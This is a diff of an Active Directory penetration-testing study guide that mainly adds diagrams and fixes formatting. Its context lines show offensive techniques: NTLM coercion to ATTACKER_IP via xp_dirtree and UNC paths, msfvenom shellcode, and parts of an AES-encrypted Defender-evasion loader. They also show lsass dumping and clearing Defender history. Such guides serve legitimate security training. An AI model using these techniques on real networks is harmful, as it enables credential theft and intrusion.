@@ -881,6 +881,8 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 
 <p>AD objects are protected by DACLs composed of individual ACEs. Misconfigured ACEs -- GenericAll, WriteDACL, ForceChangePassword granted to unprivileged groups -- create attack paths that bypass traditional credential theft.</p>
 
+<figure><img src="./img/cape/bloodhound-forcechangepassword.png" alt="BloodHound showing ForceChangePassword edge between users"></figure>
+
 <h4 id="acl-overview">1.11.1 ACL Concepts</h4>
 
 <p>Every AD object has a security descriptor containing:</p>
@@ -888,6 +890,8 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
   <li><strong>DACL (Discretionary Access Control List):</strong> Defines who has access and what operations they can perform</li>
   <li><strong>SACL (System Access Control List):</strong> Defines what operations should be audited/logged</li>
 </ul>
+<figure><img src="./img/cape/dacl-ace-permissions.png" alt="Advanced Security Settings showing DACL permission entries and ACEs"></figure>
+
 
 <p>DACLs contain Access Control Entries (ACEs) of three types:</p>
 <ul>
@@ -993,6 +997,9 @@ Set-DomainUserPassword -Identity target -AccountPassword $cred</code></pre></li>
 <h3 id="dcsync">1.12 DCSync Attack</h3>
 
 <p>DCSync uses directory replication privileges to impersonate a DC and pull password hashes directly from AD, including the KRBTGT hash for Golden Tickets.</p>
+
+<figure><img src="./img/cape/dcsync-replication-rights.png" alt="ADSI Edit showing DCSync replication rights on a domain object"></figure>
+
 
 <h4 id="dcsync-overview">1.12.1 Replication Privileges</h4>
 
@@ -1283,6 +1290,8 @@ cat records.csv</code></pre>
 
 <p>GPP allowed storing credentials in XML files (Groups.xml, Services.xml, Scheduledtasks.xml, etc.) in SYSVOL. The AES-256 key used to encrypt the <code>cpassword</code> field was published by Microsoft, making all GPP passwords trivially decryptable.</p>
 
+<figure><img src="./img/cape/gpp-cpassword-xml.png" alt="Groups.xml containing encrypted cpassword in Group Policy Preferences"></figure>
+
 <pre><code class="language-bash">gpp-decrypt [cpassword-hash]
 
 crackmapexec smb [dc-ip] -u [user] -p [password] -M gpp_autologin
@@ -1365,6 +1374,8 @@ crackmapexec smb DC_IP -u user -p pass -M gpp_password</code></pre></li>
 <h3 id="domain-trusts">1.17 Domain Trusts</h3>
 
 <p>Domain and forest trusts define authentication boundaries between AD domains. Trust direction, transitivity, and SID filtering determine cross-domain attack paths.</p>
+
+<figure><img src="./img/cape/sid-history-trust-diagram.png" alt="SID History and Trust Relationship diagram showing domain migration between forests"></figure>
 
 <h4 id="trust-types">1.17.1 Trust Types</h4>
 
@@ -1628,10 +1639,9 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Windows Digest does not cache plaintext passwords</label></li>
 <li><label><input type="checkbox"> Cannot authenticate via NTLM, DES, or RC4</label></li>
 <li><label><input type="checkbox"> TGT and long-term keys not cached after acquisition</label></li>
-<li><label><input type="checkbox"> TGT cannot be renewed beyond the original 4-hour TTL</label></li>
+<li><label><input type="checkbox"> TGT cannot be renewed beyond the original 4-hour TTL</label>
+<pre><code class="language-powershell">Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members</code></pre></li>
 </ul>
-
-<pre><code class="language-powershell">Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members</code></pre>
 
 <h4 id="hardening-process">1.20.4 Processes</h4>
 
@@ -1785,7 +1795,11 @@ group3r.exe -s</code></pre>
 
 <p><strong>Why AD matters to attackers:</strong> AD was first shipped with Windows Server 2000 and was designed to be backward-compatible. Many features are not "secure by default," and AD can be easily misconfigured. AD is essentially a large database accessible to <em>all users within the domain</em>, regardless of their privilege level. A basic AD user account with no added privileges can enumerate the majority of objects contained within AD.</p>
 
+<figure><img src="./img/cape/ad-forest-domain-structure.png" alt="Active Directory forest and domain structure with parent/child domains and OUs"></figure>
+
 <h4 id="ad-enumerable-objects">2.1.1 Objects Enumerable by Any Domain User</h4>
+
+<figure><img src="./img/cape/aduc-organizational-units.png" alt="Active Directory Users and Computers showing organizational unit structure"></figure>
 
 <table class="custom-table">
 <thead><tr><th>Object Category</th><th>Security Relevance</th></tr></thead>
@@ -2230,9 +2244,9 @@ Get-ADUser -Filter 'name -eq "[user]"'</code></pre>
 <tr><td>NUL</td><td><code>\00</code></td><td>Standard LDAP escape sequence</td></tr>
 <tr><td><code>\</code></td><td><code>\5c</code></td><td>Standard LDAP escape sequence</td></tr>
 <tr><td><code>*</code></td><td><code>\2a</code></td><td>Escaped automatically in -eq and -ne only. Use -like/-notlike for wildcards.</td></tr>
-<tr><td><code>(</code></td><td><code>/28</code></td><td>Escaped automatically</td></tr>
-<tr><td><code>)</code></td><td><code>/29</code></td><td>Escaped automatically</td></tr>
-<tr><td><code>/</code></td><td><code>/2f</code></td><td>Escaped automatically</td></tr>
+<tr><td><code>(</code></td><td><code>\28</code></td><td>Escaped automatically</td></tr>
+<tr><td><code>)</code></td><td><code>\29</code></td><td>Escaped automatically</td></tr>
+<tr><td><code>/</code></td><td><code>\2f</code></td><td>Escaped automatically</td></tr>
 </tbody>
 </table>
 
@@ -4051,6 +4065,9 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 <p>BloodHound.py uses LDAP queries and (for non-DCOnly methods) SMB connections to computers. The same defenses apply as for SharpHound: restrict LDAP query access, configure <code>RestrictRemoteSAM</code>, monitor for anomalous LDAP activity. Additionally, since BloodHound.py often comes from a Linux host outside the domain, monitoring for LDAP binds from non-domain-joined IP addresses can be an effective detection strategy.</p>
 <h3 id="bh-gui">4.5 Navigating the BloodHound GUI</h3>
 
+<figure><img src="./img/cape/bloodhound-pathfinding.png" alt="BloodHound CE pathfinding showing GenericAll edge between users"></figure>
+
+
 <p>The BloodHound GUI is the primary interface for analyzing collected data. On login, it automatically runs <strong>Find all Domain Admins</strong> and displays the result in the <strong>Graph Drawing Area</strong>.</p>
 
 <h4 id="bh-gui-graph">4.5.1 Graph Drawing Area</h4>
@@ -4318,6 +4335,8 @@ Set-DomainUserPassword -Identity [target-user] -AccountPassword $UserPassword -C
 <h3 id="bh-analysis">4.8 Analyzing BloodHound Data</h3>
 
 <p>Effective analysis of BloodHound data goes beyond clicking pre-built queries. A systematic approach ensures you find all attack paths and misconfigurations.</p>
+
+<figure><img src="./img/cape/bloodhound-analytics-graph.png" alt="BloodHound pre-built analytics queries with attack path graph visualization"></figure>
 
 <h4 id="bh-analysis-domain">4.8.1 Domain Mapping and Analysis</h4>
 
@@ -4940,6 +4959,9 @@ Invoke-AzVMRunCommand -ResourceGroupName "RG" -CommandId "RunPowerShellScript" -
 <p><strong>Why lateral movement matters:</strong> Defenders who understand lateral movement techniques can implement more effective segmentation, monitoring, and access controls. Attackers who understand these techniques can identify weaknesses in network defenses and chain together access paths that reach otherwise isolated targets.</p>
 
 <h3 id="intro-concepts">5.1 Introduction and Core Concepts</h3>
+
+<figure><img src="./img/cape/network-topology.png" alt="Network topology diagram showing domain controllers, servers, and workstations across network segments"></figure>
+
 
 <p>Lateral movement is the process of pivoting through a network after initial access, using obtained credentials or tokens to reach additional systems. Understanding the distinction between direct and indirect techniques, credential types, and network segmentation is critical for choosing the right approach.</p>
 
@@ -7560,6 +7582,11 @@ cmedb (workspace)(smb) > shares</code></pre></li>
 
 <p>There are three entities in every Kerberos transaction: the <strong>user</strong> (client), the <strong>service</strong> (application server), and the <strong>Key Distribution Center (KDC)</strong>, which runs on every Domain Controller and knows every account's secret key.</p>
 
+<figure><img src="./img/cape/kerberos-key-distribution.png" alt="Kerberos key distribution between KDC, User, and Service with their respective secret keys"></figure>
+
+
+<figure><img src="./img/cape/kerberos-auth-flow.png" alt="Kerberos authentication flow between KDC, User, and Service showing TGT and TGS exchange"></figure>
+
 <h4 id="kerb-benefits">7.1.1 Why Kerberos Over NTLM</h4>
 
 <p>Before Kerberos, authentication happened over SMB/NTLM. The user's NTLM hash was stored in memory upon authentication, meaning a compromised host exposed the hash for Pass-the-Hash attacks against <strong>any</strong> resource the user could access. Kerberos tickets, by contrast, do not contain a password and are scoped to a specific service. This is why the <strong>Double Hop Problem</strong> exists with WinRM -- Kerberos credentials are specific to each target service, so there is no password hash to silently forward.</p>
@@ -7638,6 +7665,8 @@ proxychains4 -q crackmapexec smb [dc-ip] -u 'DC01$' -p '' --ntds</code></pre>
 <h3 id="kerb-asrep">7.2 AS-REPRoasting</h3>
 
 <p><strong>AS-REPRoasting</strong> targets accounts with Kerberos pre-authentication disabled (<code>DONT_REQ_PREAUTH</code>). When pre-auth is disabled, <strong>anyone</strong> can request an AS-REP for that account without proving identity. The AS-REP contains the session key encrypted with the user's password-derived key, which can be cracked offline.</p>
+
+<figure><img src="./img/cape/kerberos-preauth-flow.png" alt="AS-REQ/AS-REP pre-authentication flow between Client and KDC"></figure>
 
 <p><strong>Root cause:</strong> The <code>DONT_REQ_PREAUTH</code> flag (UAC value <code>4194304</code>) disables the timestamp verification step in the AS exchange. Without this check, the KDC returns an encrypted AS-REP to any requester. The session key portion is encrypted with the user's password hash (RC4/AES), making it crackable with tools like Hashcat (mode <code>18200</code>).</p>
 
@@ -8813,6 +8842,8 @@ dir \\[sql-fqdn]\c$</code></pre>
 
 <p>Within the Windows security ecosystem, <strong>tokens</strong> and <strong>security descriptors</strong> are the two main variables of the object security equation. Tokens identify the security context of a process or thread, while security descriptors contain the security information associated with an object. To enforce the <strong>Confidentiality</strong> pillar of the CIA triad, Windows uses <strong>Access Control Lists (ACLs)</strong> -- a mechanism that enumerates which system entities are permitted to access a resource and which access modes are granted to each entity (per RFC 4949).</p>
 
+<figure><img src="./img/cape/acl-abuse-mindmap.png" alt="ACL abuse attack paths mindmap showing GenericAll, WriteDacl, WriteProperty and associated tools"></figure>
+
 <p>Four general categories of access control policies exist:</p>
 <table class="custom-table">
 <thead><tr><th>Policy</th><th>Acronym</th><th>Description</th></tr></thead>
@@ -9673,6 +9704,9 @@ crackmapexec ldap [target-ip] -u yolanda -p [password]</code></pre>
 
 <p><strong>PKINIT</strong> (Public Key Cryptography for Initial Authentication) is a pre-authentication extension defined in RFC 4556 that allows asymmetric authentication using X.509 certificates instead of password-derived keys. Microsoft's implementation is specified in <code>[MS-PKCA]</code>. With PKINIT, a client proves identity using a private key corresponding to a public key registered in AD, rather than a password hash.</p>
 
+<figure><img src="./img/cape/shadow-credentials-pkinit.png" alt="Shadow Credentials PKINIT flow showing AS-REQ with private key and public key verification against msDS-KeyCredentialLink"></figure>
+
+
 <h4 id="shadow-passwordless">9.1.2 Passwordless Authentication and Key Trust</h4>
 
 <p>Microsoft introduced <strong>Key Trust</strong> in Windows Server 2016 to enable passwordless authentication without requiring Certificate Trust. Under Key Trust, PKINIT authentication uses raw key data stored in the <code>msDS-KeyCredentialLink</code> attribute instead of a certificate issued by AD CS.</p>
@@ -9705,6 +9739,9 @@ crackmapexec ldap [target-ip] -u yolanda -p [password]</code></pre>
 <p>When a client uses PKINIT, Microsoft includes the NTLM hash inside the <strong>Privilege Attribute Certificate (PAC)</strong> in an encrypted <code>NTLM_SUPPLEMENTAL_CREDENTIAL</code> entity within the ticket. The TGT is encrypted with the KRBTGT key, which the client cannot decrypt. However, by performing <strong>Kerberos User-to-User (U2U)</strong> authentication to itself, the client can obtain a service ticket encrypted with its own session key (which it possesses), allowing decryption of the PAC and extraction of the NTLM hash.</p>
 
 <p><strong>Why this works:</strong> In a U2U TGS-REQ, the KDC uses the target user's TGT as an additional ticket. The KDC extracts the session key from the TGT's encrypted portion and generates a service ticket encrypted with that session key. If a user requests a U2U service ticket from itself to itself, the resulting ticket is encrypted with a key the user already has, granting access to the PAC contents including the NTLM hash.</p>
+
+<figure><img src="./img/cape/unpac-the-hash-flow.png" alt="UnPAC-the-hash attack flow showing PKINIT AS-REQ to TGS-REP with NTLM hash extraction from PAC"></figure>
+
 
 <h4 id="shadow-prerequisites">9.1.5 Prerequisites</h4>
 
@@ -9917,6 +9954,8 @@ cd Adalanche && pwsh build.ps1
 ./adalanche-linux-x64-* analyze --datapath data
 # Right-click on the user node -> "What can this node pwn?"
 # Look for WriteScriptPath edges</code></pre>
+
+<figure><img src="./img/cape/adalanche-graph.png" alt="Adalanche graph analysis showing Active Directory relationships and attack paths"></figure>
 
 <h4 id="logon-enum-windows">9.2.4 Enumeration from Windows</h4>
 
@@ -10780,6 +10819,10 @@ foreach ($event in $events) {
 
 <p>NTLM is a <strong>challenge-response</strong> protocol that uses <strong>nonces</strong> (pseudo-random numbers generated for one-time use) as a defensive mechanism against replay attacks. The protocol is best implemented as a function library called by application protocols rather than as a standalone network stack layer.</p>
 
+<figure><img src="./img/cape/ntlm-auth-flow.png" alt="NTLM authentication flow between Client, Server, and Domain Controller showing NEGOTIATE, CHALLENGE, and AUTHENTICATE messages"></figure>
+<figure><img src="./img/cape/ntlm-local-auth-flow.png" alt="NTLM local authentication flow between Client and Server without Domain Controller involvement"></figure>
+
+
 <p>The <strong>Security Support Provider Interface (SSPI)</strong> is the foundation of Windows authentication &mdash; an API that allows connected applications to call one of several security providers to establish authenticated connections. A <strong>Security Support Provider (SSP)</strong> is a DLL responsible for implementing the SSPI by exposing one or more security packages. The <strong>NTLM SSP</strong> (located at <code>%Windir%\System32\msv1_0.dll</code>) is the binary messaging protocol utilized by SSPI to facilitate NTLM challenge-response authentication and negotiate options for integrity and confidentiality.</p>
 
 <p>Key facts to remember about domain-joined NTLM authentication:</p>
@@ -11532,6 +11575,9 @@ SQL> xp_dirtree '\\ATTACKER_IP\share'</code></pre>
 </table>
 <h3 id="auth-coercion">10.8 Authentication Coercion</h3>
 
+<figure><img src="./img/cape/printer-bug-attack.png" alt="Printer Bug attack diagram showing MS-RPRN coercion chain between domain controllers"></figure>
+
+
 <p><strong>Authentication coercion</strong> is a targeted, less opportunistic technique compared to poisoning/spoofing. It forces a client to authenticate against the attacker even without the client intending to initiate authentication. These techniques rely on <strong>insecure code in RPC protocols</strong> used by sensitive servers. The root cause is that <strong>Windows machines automatically authenticate to other machines when trying to access UNC paths</strong> like <code>\\ATTACKER_IP\file.txt</code>.</p>
 
 <p><strong>Common coercion sequence:</strong></p>
@@ -12143,6 +12189,8 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 <h4 id="esc1-understanding">11.3.1 Understanding ESC1</h4>
 
 <p>ESC1 exploits a certificate template that allows the <strong>enrollee to specify an arbitrary Subject Alternative Name (SAN)</strong> in the CSR. When a low-privileged user can request a certificate with the SAN set to a privileged account (e.g., Administrator), the CA issues a certificate that authenticates as that account.</p>
+
+<figure><img src="./img/cape/adcs-esc1-template.png" alt="Certificate Templates Console showing ESC1 vulnerable template properties"></figure>
 
 
 <h4 id="esc1-requirements">11.3.2 Abuse Requirements</h4>
@@ -13066,6 +13114,9 @@ cd BloodHound-linux-x64/
 
 <p>Understanding the trust landscape is the first step in any AD engagement. Trust relationships define how authentication flows between domains and forests, and each type has different security implications.</p>
 
+<figure><img src="./img/cape/bloodhound-trust-mapping.png" alt="BloodHound trust mapping showing TrustedBy edges between multiple domains"></figure>
+
+
 <h4 id="trust-types">12.1.1 Trust Types</h4>
 
 <table class="custom-table">
@@ -13147,6 +13198,8 @@ Get-DomainTrustMapping</code></pre></li>
 
 <p><strong>Root cause:</strong> When unconstrained delegation is enabled, the KDC includes the user's TGT inside the service ticket (via the <code>OK-AS-DELEGATE</code> flag). The server then caches this TGT in memory. If delegation were not enabled, only the TGS ticket would be stored, limiting impersonation to that specific service. Users with the <code>Account is sensitive and cannot be delegated</code> flag or members of the <code>Protected Users</code> group are immune because their TGTs are not forwarded.</p>
 
+<figure><img src="./img/cape/unconstrained-delegation-settings.png" alt="Active Directory delegation settings showing Trust this computer for delegation to any service"></figure>
+
 <p><strong>Attack scenarios in intra-forest context:</strong></p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> <strong>Passive:</strong> Wait for a parent domain administrator to log into the compromised child DC, then extract their TGT.</label></li>
@@ -13227,6 +13280,9 @@ certipy auth -pfx $DC_HOSTNAME.pfx</code></pre></li>
 <h4 id="pkinit-overview">11.16.1 PKINIT Overview</h4>
 
 <p><strong>PKINIT</strong> (Public Key Cryptography for Initial Authentication in Kerberos) extends Kerberos to allow certificate-based initial authentication. Instead of symmetric-key pre-authentication, the client uses an X.509 certificate and its private key to prove identity to the KDC. This is the default method Certipy and Rubeus use to obtain TGTs from certificates.</p>
+
+<figure><img src="./img/cape/pkinit-certificate-auth.png" alt="PKINIT certificate-based authentication flow showing AS-REQ with private key and certificate chain validation by KDC"></figure>
+
 
 <h4 id="schannel-auth">11.16.2 Schannel Authentication</h4>
 
@@ -14623,6 +14679,8 @@ sliver (session) > sharpup -- audit</code></pre></li>
 sliver (beacon) > procdump --pid &lt;lsass_pid&gt; --save /tmp/lsass.dmp</code></pre></li>
 </ul>
 
+<figure><img src="./img/cape/lsa-runasppl-registry.png" alt="Registry Editor showing LSA RunAsPPL setting for credential protection"></figure>
+
 <!-- ===================== 13.6 Persistence ===================== -->
 
 <h3 id="persistence">13.6 Persistence</h3>
@@ -15009,6 +15067,8 @@ sliver (session) > psexec --custom-exe psexec-pivot.exe --service-name Teams [ta
 <h3 id="kerberos-delegation">13.12 Kerberos Delegation</h3>
 
 <p>Kerberos delegation allows a service to act on behalf of a user to access other services. Misconfigured delegation can lead to full domain compromise.</p>
+
+<figure><img src="./img/cape/constrained-delegation-properties.png" alt="Constrained delegation properties showing allowed services for WEB01"></figure>
 
 <h4 id="unconstrained-delegation">13.12.1 Unconstrained Delegation</h4>
 
@@ -15466,6 +15526,9 @@ WHERE Name =~ "^Sliver" or
 
 <p>Microsoft Defender Antivirus ships pre-installed on every copy of Windows since Windows 8, making it the most commonly encountered AV solution during engagements. It is the baseline adversaries must defeat, and it employs both traditional signature-based detection and modern machine-learning models.</p>
 
+<figure><img src="./img/cape/windows-defender-ui.png" alt="Windows Security Virus and threat protection interface"></figure>
+
+
 
 <h4 id="defender-powershell">14.1.2 Interacting with Defender via PowerShell</h4>
 
@@ -15520,10 +15583,7 @@ Set-MpPreference -DisableRealTimeMonitoring $false</code></pre>
 <li><label><input type="checkbox"> <code>DetectionSourceTypeID</code> -- how the detection was triggered (on-access, behavioral, etc.)</label></li>
 <li><label><input type="checkbox"> <code>ProcessName</code> -- which process triggered the detection</label></li>
 <li><label><input type="checkbox"> <code>Resources</code> -- the file or memory region flagged</label></li>
-<li><label><input type="checkbox"> <code>InitialDetectionTime</code> / <code>RemediationTime</code> -- timeline of detection and response</label></li>
-</ul>
-
-
+<li><label><input type="checkbox"> <code>InitialDetectionTime</code> / <code>RemediationTime</code> -- timeline of detection and response</label>
 <pre><code class="language-powershell"># Example: viewing a Cobalt Strike detection
 PS C:\> Get-MpThreat
 CategoryID       : 6
@@ -15538,7 +15598,8 @@ ActionSuccess                  : True
 DetectionSourceTypeID          : 3
 DomainUser                     : WIN-I092S2V54F8\Administrator
 InitialDetectionTime           : 4/9/2024 9:38:39 AM
-Resources                      : {file:_C:\artifact_x64.exe}</code></pre>
+Resources                      : {file:_C:\artifact_x64.exe}</code></pre></li>
+</ul>
 
 <p><strong>Clearing protection history:</strong> Delete all files in <code>C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service</code>.</p>
 
@@ -15646,10 +15707,7 @@ while (i &lt; buf.Length)
 <li><label><input type="checkbox"> Generate shellcode (e.g., <code>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp</code>)</label></li>
 <li><label><input type="checkbox"> AES-encrypt the raw shellcode bytes using CyberChef (with an arbitrary 16-byte key and IV)</label></li>
 <li><label><input type="checkbox"> Base64-encode the encrypted output for easy embedding in C#</label></li>
-<li><label><input type="checkbox"> At runtime: Base64-decode, AES-decrypt, then write to memory</label></li>
-</ul>
-
-
+<li><label><input type="checkbox"> At runtime: Base64-decode, AES-decrypt, then write to memory</label>
 <pre><code class="language-csharp">using System;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -15705,7 +15763,8 @@ namespace NotMalware
             WaitForSingleObject(hThread, 0xffffffff);
         }
     }
-}</code></pre>
+}</code></pre></li>
+</ul>
 
 <p><strong>Why AES works:</strong> Unlike XOR, AES encryption produces ciphertext that is computationally indistinguishable from random data without the key. Defender cannot decrypt the payload during a static scan, so no signature match occurs. ThreatCheck confirms: "No threat found!"</p>
 
@@ -16721,13 +16780,11 @@ C:\Windows\Tasks\payload.exe</code></pre></li>
 <p><strong>Locations:</strong></p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> 32-bit: <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe</code></label></li>
-<li><label><input type="checkbox"> 64-bit: <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</code></label></li>
-</ul>
-
-
+<li><label><input type="checkbox"> 64-bit: <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</code></label>
 <pre><code class="language-powershell"># Verify InstallUtil is allowed by AppLocker
 Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
-# Output: Allowed (Default Rule) All files located in the Windows folder</code></pre>
+# Output: Allowed (Default Rule) All files located in the Windows folder</code></pre></li>
+</ul>
 
 <p><strong>How to abuse it:</strong> Create a C# class that extends <code>System.Configuration.Install.Installer</code> and override the <code>Uninstall</code> method. When InstallUtil is told to uninstall the compiled assembly, it executes whatever code is in the <code>Uninstall</code> method.</p>
 
@@ -17192,6 +17249,8 @@ Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force</code></pre>
 
 <p>In AD penetration testing, MSSQL servers are high-value targets because they often run under domain service accounts with excessive privileges, store sensitive data, and can serve as pivot points for lateral movement through linked servers.</p>
 
+<figure><img src="./img/cape/ssms-object-explorer.png" alt="SQL Server Management Studio Object Explorer connected to database instance"></figure>
+
 <h4 id="mssql-accessing">15.1.1 Accessing MSSQL Server</h4>
 
 <p>Credentials for MSSQL instances are often discovered in configuration files during assessments. A typical discovery might look like:</p>
@@ -17301,10 +17360,7 @@ REVERT;</code></pre>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Identify a trustworthy database owned by sa</label></li>
   <li><label><input type="checkbox"> Obtain <code>db_owner</code> role in that database (possibly via login impersonation)</label></li>
-  <li><label><input type="checkbox"> Create and execute a privilege escalation stored procedure</label></li>
-</ul>
-
-
+  <li><label><input type="checkbox"> Create and execute a privilege escalation stored procedure</label>
 <pre><code class="language-sql">-- Check if our impersonated user has db_owner
 USE webshop;
 EXECUTE AS LOGIN = 'ws_user';
@@ -17324,7 +17380,8 @@ DROP PROCEDURE sp_privesc;
 -- Verify
 REVERT;
 SELECT SYSTEM_USER;
-SELECT IS_SRVROLEMEMBER('sysadmin');</code></pre>
+SELECT IS_SRVROLEMEMBER('sysadmin');</code></pre></li>
+</ul>
 
 <h4 id="mssql-unc-injection">15.2.3 UNC Path Injection</h4>
 
@@ -18162,12 +18219,10 @@ pip install -r requirements.txt</code></pre>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Checks the DACL for the System Management container</label></li>
   <li><label><input type="checkbox"> Checks for published Management Points</label></li>
-  <li><label><input type="checkbox"> Searches for strings "SCCM" and "MECM" in the directory</label></li>
-</ul>
-
-
+  <li><label><input type="checkbox"> Searches for strings "SCCM" and "MECM" in the directory</label>
 <pre><code class="language-bash"># View results
-python3 sccmhunter.py show -all</code></pre>
+python3 sccmhunter.py show -all</code></pre></li>
+</ul>
 
 <p><strong>SMB Profiling (smb module):</strong> Profiles SCCM servers to identify site roles, signing status, services:</p>
 
